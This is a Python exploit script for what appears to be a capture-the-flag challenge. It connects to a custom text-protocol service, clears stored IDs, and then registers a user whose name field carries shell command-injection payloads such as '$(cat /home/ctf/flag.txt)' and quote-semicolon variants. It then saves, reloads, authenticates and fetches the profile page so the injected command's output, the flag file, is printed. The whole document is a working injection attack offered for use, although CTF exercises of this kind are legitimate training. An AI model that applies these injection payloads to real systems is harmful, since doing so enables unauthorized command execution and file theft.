#!/usr/bin/env python3
import os
import re
import socket
import sys
import time


def recv_all(sock: socket.socket, timeout: float = 0.5) -> bytes:
    sock.settimeout(timeout)
    chunks: list[bytes] = []
    try:
        while True:
            data = sock.recv(4096)
            if not data:
                break
            chunks.append(data)
            if len(data) < 4096:
                break
    except Exception:
        pass
    return b"".join(chunks)


def send_line(sock: socket.socket, line: str, delay_s: float = 0.2) -> bytes:
    if not line.endswith("\n"):
        line += "\n"
    sock.sendall(line.encode())
    time.sleep(delay_s)
    return recv_all(sock, 0.8)


def run_once(ip: str, port: int, payload_cmd: str) -> None:
    with socket.create_connection((ip, port), timeout=5) as s:
        _ = recv_all(s, 0.3)

        # Vaciar posibles IDs 1..10
        for i in range(1, 11):
            send_line(s, f"DDKE {i}")

        # Registrar con payload
        reg_resp = send_line(s, payload_cmd)
        assigned_id = 1
        m = re.search(rb"Registered: ID->(\d+)", reg_resp)
        if m:
            assigned_id = int(m.group(1))

        # Guardar, recargar, autenticar y leer
        send_line(s, f"SAVE {assigned_id}")
        send_line(s, "RLDB")
        send_line(s, f"AUTH {assigned_id}")
        page = send_line(s, "GTPR").decode(errors="ignore")

        print("=== PAGE START ===")
        print(page)
        print("=== PAGE END ===")


def resolve_ip_port() -> tuple[str, int]:
    # Leer de khp_instance.env o de argumentos
    env_file = "/workspace/challenges/khp_instance.env"
    ip: str | None = None
    port: int | None = None
    if os.path.exists(env_file):
        with open(env_file, "r", encoding="utf-8") as f:
            for line in f:
                if line.startswith("IP="):
                    ip = line.strip().split("=", 1)[1]
                elif line.startswith("PORT="):
                    try:
                        port = int(line.strip().split("=", 1)[1])
                    except Exception:
                        pass
    if len(sys.argv) >= 3:
        ip = sys.argv[1]
        port = int(sys.argv[2])
    if not ip or not port:
        raise SystemExit("Falta IP/PORT")
    return ip, port


def main() -> None:
    ip, port = resolve_ip_port()

    # Variantes de payload (enviar literalmente, sin expansión local)
    payloads: list[str] = [
        r"REKE $(cat /home/ctf/flag.txt):x",
        r"REKE u:$(cat /home/ctf/flag.txt)",
        r"REKE $(/bin/cat /home/ctf/flag.txt):x",
        r"REKE u:$(/bin/cat /home/ctf/flag.txt)",
        r"REKE \";/bin/cat /home/ctf/flag.txt;# :x",
        r"REKE u:\";/bin/cat /home/ctf/flag.txt;#",
    ]

    for payload in payloads:
        print(f"=== TRY: {payload} ===")
        try:
            run_once(ip, port, payload)
        except Exception as e:
            print("ERR:", e)
        time.sleep(0.3)


if __name__ == "__main__":
    main()

